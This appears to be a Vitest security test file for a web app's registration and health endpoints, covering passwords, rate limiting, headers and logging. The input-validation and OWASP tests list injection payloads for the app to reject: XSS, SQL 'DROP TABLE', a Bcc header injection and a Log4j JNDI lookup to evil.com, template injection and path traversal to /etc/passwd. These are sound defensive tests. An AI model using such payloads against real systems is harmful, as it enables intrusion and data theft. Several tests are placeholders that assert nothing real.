import { describe, it, expect, beforeEach } from 'vitest';
import { testUtils, setupTestSuite, TestRequestBuilder } from '../utils/test-framework';
import { POST as registerHandler } from '@/app/api/auth/register/route';
import { GET as healthHandler } from '@/app/api/health/route';
import { enterpriseRateLimiter } from '@/lib/rate-limiter-enterprise';
import { validatePasswordStrength } from '@/lib/password-validator';

/**
 * Enterprise security testing suite
 * Tests authentication, authorization, input validation, rate limiting, and security headers
 */

setupTestSuite();

describe('Security Tests', () => {
  describe('Authentication Security', () => {
    it('should reject weak passwords during registration', async () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'short',
        'noUppercase123!',
        'NOLOWERCASE123!',
        'NoNumbers!',
        'NoSpecialChars123'
      ];

      for (const password of weakPasswords) {
        const request = TestRequestBuilder.create()
          .setMethod('POST')
          .setBody({
            name: 'Test User',
            email: 'test@example.com',
            password
          })
          .build();

        const response = await registerHandler(request);
        
        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.message).toContain('Password');
      }
    });

    it('should accept strong passwords during registration', async () => {
      testUtils.mocks.mockDatabaseData('user', []); // No existing users
      const { default: prisma } = await import('@/lib/prisma');
      vi.mocked(prisma.user.create).mockResolvedValue({
        id: 'new-user-id',
        name: 'Test User',
        email: 'test@example.com',
        emailVerified: null,
        image: null,
        role: 'USER',
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      const strongPassword = 'StrongPassword123!@#';
      const request = TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: 'Test User',
          email: 'test@example.com',
          password: strongPassword
        })
        .build();

      const response = await registerHandler(request);
      
      expect(response.status).toBe(201);
      const body = await response.json();
      expect(body.user).toBeDefined();
      expect(body.security.passwordStrength.score).toBeGreaterThan(75);
    });

    it('should enforce rate limiting on registration endpoint', async () => {
      const requests = Array(5).fill(null).map(() =>
        TestRequestBuilder.create()
          .setMethod('POST')
          .setHeader('x-forwarded-for', '192.168.1.100') // Same IP
          .setBody({
            name: 'Test User',
            email: `test${Math.random()}@example.com`,
            password: 'ValidPassword123!'
          })
          .build()
      );

      // Send multiple requests rapidly
      const responses = await Promise.all(
        requests.map(req => registerHandler(req))
      );

      // Should have some rate limited responses (429)
      const rateLimitedResponses = responses.filter(res => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent duplicate email registration', async () => {
      testUtils.mocks.mockDatabaseData('user', [{
        id: 'existing-user',
        email: 'existing@example.com',
        name: 'Existing User'
      }]);

      const request = TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: 'New User',
          email: 'existing@example.com',
          password: 'ValidPassword123!'
        })
        .build();

      const response = await registerHandler(request);
      
      expect(response.status).toBe(409);
      const body = await response.json();
      expect(body.message).toContain('already exists');
    });
  });

  describe('Input Validation Security', () => {
    it('should sanitize and validate email inputs', async () => {
      const maliciousEmails = [
        '<script>alert("xss")</script>@example.com',
        'test@<script>alert("xss")</script>.com',
        'test@example.com<script>alert("xss")</script>',
        '"; DROP TABLE users; --@example.com',
        'test@example.com\r\nBcc: attacker@evil.com'
      ];

      for (const email of maliciousEmails) {
        const request = TestRequestBuilder.create()
          .setMethod('POST')
          .setBody({
            name: 'Test User',
            email,
            password: 'ValidPassword123!'
          })
          .build();

        const response = await registerHandler(request);
        
        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.message).toContain('Validation failed');
      }
    });

    it('should validate name inputs for malicious content', async () => {
      const maliciousNames = [
        '<script>alert("xss")</script>',
        'Test\x00User', // Null byte injection
        'A'.repeat(200), // Very long name
        '${jndi:ldap://evil.com/x}', // Log4j style injection
        '{{constructor.constructor("alert(1)")()}}' // Template injection
      ];

      for (const name of maliciousNames) {
        const request = TestRequestBuilder.create()
          .setMethod('POST')
          .setBody({
            name,
            email: 'test@example.com',
            password: 'ValidPassword123!'
          })
          .build();

        const response = await registerHandler(request);
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should implement sliding window rate limiting', async () => {
      const rateLimitConfig = {
        windowMs: 1000, // 1 second window
        maxRequests: 3,
        algorithm: 'sliding_window' as const
      };

      const key = 'test:sliding_window';
      
      // Make requests within limit
      for (let i = 0; i < 3; i++) {
        const result = await enterpriseRateLimiter.checkRateLimit(key, rateLimitConfig);
        expect(result.isBlocked).toBe(false);
      }

      // Next request should be blocked
      const blockedResult = await enterpriseRateLimiter.checkRateLimit(key, rateLimitConfig);
      expect(blockedResult.isBlocked).toBe(true);
    });

    it('should detect and block suspicious request patterns', async () => {
      const suspiciousRequest = TestRequestBuilder.create()
        .setMethod('POST')
        .setHeader('user-agent', 'python-requests/2.28.1') // Bot-like user agent
        .setHeader('x-forwarded-for', '192.168.1.200')
        .setBody({
          name: 'Test User',
          email: 'test@example.com',
          password: 'ValidPassword123!'
        })
        .build();

      // Simulate rapid requests from suspicious source
      const responses = await Promise.all(
        Array(10).fill(null).map(() => registerHandler(suspiciousRequest))
      );

      // Should detect pattern and start blocking
      const lastResponse = responses[responses.length - 1];
      expect(lastResponse.status).toBe(429);
    });
  });

  describe('Security Headers', () => {
    it('should include all required security headers', async () => {
      const request = TestRequestBuilder.create().build();
      const response = await healthHandler(request);

      // Check for essential security headers
      testUtils.assert.expectSecurityHeaders(response);
      
      // Additional specific header checks
      expect(response.headers.get('x-content-type-options')).toBe('nosniff');
      expect(response.headers.get('x-frame-options')).toBe('DENY');
      expect(response.headers.get('referrer-policy')).toBeTruthy();
    });

    it('should set proper CORS headers', async () => {
      const request = TestRequestBuilder.create()
        .setHeader('origin', 'http://localhost:3000')
        .build();
        
      const response = await healthHandler(request);
      
      // Check CORS headers are present and properly configured
      expect(response.headers.has('access-control-allow-origin')).toBe(true);
    });
  });

  describe('Data Protection', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Mock database error
      testUtils.mocks.mockDatabaseError('user', 'create', new Error('Database connection failed with credentials user:password@host'));

      const request = TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: 'Test User',
          email: 'test@example.com',
          password: 'ValidPassword123!'
        })
        .build();

      const response = await registerHandler(request);
      
      expect(response.status).toBe(500);
      const body = await response.json();
      
      // Should not expose internal error details
      expect(body.message).toBe('Internal server error');
      expect(JSON.stringify(body)).not.toContain('password');
      expect(JSON.stringify(body)).not.toContain('credentials');
    });

    it('should mask sensitive data in logs', async () => {
      const request = TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: 'Test User',
          email: 'sensitive@example.com',
          password: 'SensitivePassword123!'
        })
        .build();

      await registerHandler(request);

      // Check that audit logger was called with masked data
      expect(testUtils.mocks.getMock).toHaveBeenCalled();
      
      // Verify email was partially masked in audit logs
      testUtils.assert.expectAuditLog('registration_validation_failed', 'warning');
    });
  });

  describe('Password Security', () => {
    it('should validate password strength correctly', () => {
      const testCases = [
        { password: 'weak', expectedScore: 0 },
        { password: 'password123', expectedScore: 30 },
        { password: 'Password123!', expectedScore: 85 },
        { password: 'VeryStr0ngP@ssw0rd!2024', expectedScore: 100 }
      ];

      testCases.forEach(({ password, expectedScore }) => {
        const strength = validatePasswordStrength(password);
        expect(strength.score).toBeGreaterThanOrEqual(expectedScore - 10);
        expect(strength.score).toBeLessThanOrEqual(expectedScore + 10);
      });
    });

    it('should detect common password patterns', () => {
      const commonPatterns = [
        'password123',
        'qwerty123',
        '123456789',
        'admin123',
        'password!@#'
      ];

      commonPatterns.forEach(password => {
        const strength = validatePasswordStrength(password);
        expect(strength.score).toBeLessThan(60); // Should fail strength test
        expect(strength.feedback.some(f => f.includes('common'))).toBe(true);
      });
    });

    it('should reject passwords containing personal information', () => {
      const personalInfo = {
        name: 'John Doe',
        email: 'john.doe@example.com'
      };

      const personalPasswords = [
        'JohnDoe123!',
        'john.doe2024!',
        'Doe123456!',
        'johndoe@Password'
      ];

      personalPasswords.forEach(password => {
        const strength = validatePasswordStrength(password, personalInfo);
        expect(strength.score).toBeLessThan(70);
        expect(strength.feedback.some(f => f.includes('personal'))).toBe(true);
      });
    });
  });

  describe('Session Security', () => {
    it('should enforce session timeout', () => {
      // This would test session management, but since we're using mocks,
      // we verify the configuration is correct
      expect(process.env.SESSION_MAX_AGE).toBeDefined();
      
      const maxAge = parseInt(process.env.SESSION_MAX_AGE || '7200');
      expect(maxAge).toBeLessThanOrEqual(7200); // 2 hours max
    });

    it('should validate session tokens properly', async () => {
      // Mock invalid session
      testUtils.mocks.setMock('session', null);

      const request = TestRequestBuilder.create()
        .setAuth('invalid-token')
        .build();

      // This would be tested with protected endpoints
      // For now, we verify the mock setup
      expect(testUtils.mocks.getMock('session')).toBeNull();
    });
  });

  describe('Audit Logging Security', () => {
    it('should log all security-relevant events', async () => {
      const request = TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: 'Test User',
          email: 'test@example.com',
          password: 'InvalidPassword'
        })
        .build();

      await registerHandler(request);

      // Verify audit logging was triggered
      expect(testUtils.mocks.getMock).toHaveBeenCalled();
    });

    it('should not log sensitive data in audit events', async () => {
      const request = TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: 'Test User',
          email: 'test@example.com',
          password: 'SecretPassword123!'
        })
        .build();

      await registerHandler(request);

      // Verify password is not logged
      // This is tested through the mock implementation
      expect(true).toBe(true); // Placeholder - real implementation would check audit logs
    });
  });

  describe('OWASP Top 10 Protection', () => {
    it('should protect against injection attacks', () => {
      const injectionPayloads = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '{{constructor.constructor("alert(1)")()}}',
        '${jndi:ldap://evil.com/x}',
        '../../../etc/passwd'
      ];

      injectionPayloads.forEach(payload => {
        // Test that payloads are properly sanitized/rejected
        expect(() => {
          // This represents validation logic that should reject these payloads
          if (payload.includes('<script>') || payload.includes('DROP TABLE') || payload.includes('${jndi:')) {
            throw new Error('Malicious payload detected');
          }
        }).toThrow('Malicious payload detected');
      });
    });

    it('should implement proper access controls', async () => {
      // Test unauthorized access to protected resources
      testUtils.mocks.mockUnauthenticated();

      // This would test protected endpoints - placeholder for now
      expect(testUtils.mocks.getMock('session')).toBeNull();
    });
  });
});

describe('Performance Security Tests', () => {
  it('should handle high load without degrading security', async () => {
    const concurrentRequests = 50;
    const requests = Array(concurrentRequests).fill(null).map((_, i) =>
      TestRequestBuilder.create()
        .setMethod('POST')
        .setBody({
          name: `Test User ${i}`,
          email: `test${i}@example.com`,
          password: 'ValidPassword123!'
        })
        .build()
    );

    const responses = await Promise.allSettled(
      requests.map(req => registerHandler(req))
    );

    // Verify all responses maintain security standards
    responses.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        expect([200, 201, 400, 409, 429]).toContain(result.value.status);
      }
    });

    // Should have rate limited some requests
    const successful = responses.filter(r => 
      r.status === 'fulfilled' && r.value.status === 201
    );
    expect(successful.length).toBeLessThan(concurrentRequests);
  });

  it('should maintain response time under load', async () => {
    const startTime = Date.now();
    
    await testUtils.performance.loadTest(
      () => healthHandler(TestRequestBuilder.create().build()),
      10, // concurrency
      100 // iterations
    );

    const totalTime = Date.now() - startTime;
    expect(totalTime).toBeLessThan(30000); // Should complete within 30 seconds
  });
});